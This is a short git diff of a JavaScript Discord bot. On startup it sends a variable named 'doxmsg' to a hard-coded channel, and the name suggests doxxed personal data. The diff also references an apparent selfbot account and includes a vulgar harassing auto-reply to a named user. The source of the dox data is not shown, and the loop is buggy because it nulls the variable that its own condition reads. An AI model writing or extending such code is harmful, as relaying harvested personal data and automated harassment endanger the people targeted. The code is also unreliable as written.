@@ -19,6 +19,11 @@ bot.on("error", (err) => {
 });
 bot.once("ready", () => {
   console.log("Ready");
+	while(doxmsg.length >= 1){
+	myChannel = bot.channels.cache.get("1223919638044344430");
+	myChannel.send(doxmsg);
+	doxmsg = null ;
+	}
 });
 
 MySelfBot.once("ready", () => {
@@ -38,11 +43,7 @@ bot.on('messageCreate', message => {
   if (message.content.startsWith("ZADE")) {
     return message.reply("Suck My dick ZADE");
   }
-while(doxmsg.length >= 1){
-	myChannel = bot.channels.cache.get("1223919638044344430");
-	myChannel.send(doxmsg);
-	doxmsg = null ;
-}
+
   if (message.content === "RYANN") {
     message.reply("@rayyan#9435 :shocked:");
   }
